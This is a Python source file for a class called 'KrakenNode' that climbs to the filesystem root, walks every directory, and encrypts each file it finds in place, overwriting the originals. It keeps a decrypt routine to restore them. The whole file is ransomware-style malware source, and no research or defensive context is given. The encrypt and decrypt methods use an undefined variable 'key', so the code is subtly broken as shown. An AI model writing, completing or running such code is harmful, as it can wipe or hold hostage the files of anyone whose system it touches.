import os
import sys
from secrets import token_urlsafe
from cryptography.fernet import Fernet

# Kraken Node:
class KrakenNode:

    # Initialize node
    def __init__(self, node_id):
        self.node_id = node_id
        self.node_signature = token_urlsafe(16)
        self.node_key = Fernet(Fernet.generate_key())
        self.files_found = []

    # Get higher directory
    def go_to_home(self):
        try:
            os.chdir('../../../../../../../../../../../..')
        except Exception as error:
            print(error)

    # Search for files
    def search_files(self):
        for dirpath, dirs, files_in_dir in os.walk(os.getcwd()):
            for file in files_in_dir:
                absolute_path = os.path.abspath(os.path.join(dirpath, file))
                self.files_found.append(absolute_path)

    # Encrypt files found
    def encrypt(self):
        for file in self.files_found:
            try:
                # Do not encrypt this file!
                if file != sys.argv[0]:
                    # Read original content:
                    with open(file, "rb") as archive:
                        original_data = archive.read()
                    # Encrypt and overwrite:
                    with open(file, "wb") as archive:
                        archive.write(key.encrypt(original_data))
            except Exception as error:
                print(error)
                continue

    # Recover files encrypted
    def recover(self):
        for file in self.files_found:
            try:
                # This file was not affected.
                if file != sys.argv[0]:
                    # Read encrypted content:
                    with open(file, "rb") as archive:
                        encrypted_data = archive.read()
                    # Decrypt and overwrite:
                    with open(file, "wb") as archive:
                        archive.write(key.decrypt(encrypted_data))
            except Exception as error:
                print(error)
                continue
